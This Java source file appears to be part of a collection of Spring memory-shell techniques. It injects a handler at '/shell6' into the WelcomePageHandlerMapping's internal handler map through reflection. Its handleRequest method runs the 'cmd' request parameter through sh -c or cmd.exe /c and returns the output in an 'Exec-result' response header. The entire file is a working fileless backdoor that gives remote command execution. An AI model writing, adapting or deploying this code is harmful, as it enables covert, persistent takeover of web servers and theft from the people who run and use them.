package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.HandlerMapping;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import java.io.InputStream;
import java.util.List;
import java.util.Scanner;
import java.lang.reflect.Field;
import java.util.Map;

public class No6_WelcomePageHandlerMappingShell implements Controller {

    public static String injectShell() throws Exception{
        DispatcherServlet servlet = new Util().getServlet();
        List<HandlerMapping> handlerMappings = (List<HandlerMapping>) Util.getFieldValue(servlet,"handlerMappings");
        HandlerMapping welcomePageHandlerMapping = null;
        for (HandlerMapping handlerMapping : handlerMappings) {
            if (handlerMapping.toString().startsWith("org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping")) {
                welcomePageHandlerMapping = handlerMapping;
            }
        }

        Class abstractUrlHandlerMapping = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping");
        Field field = abstractUrlHandlerMapping.getDeclaredField("handlerMap");
        field.setAccessible(true);
        Map handlerMap = (Map) field.get(welcomePageHandlerMapping);
        handlerMap.put("/shell6",new No2_ControllerHandlerShell());
        return "{\"result\":\"No6_WelcomePageHandlerMappingShell\"}";
    }

    @Override
    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
//            response.getWriter().write(output);
//            response.getWriter().flush();
//            response.getWriter().close();
            response.setHeader("Exec-result", new String(output));
        }
        return null;
    }
}

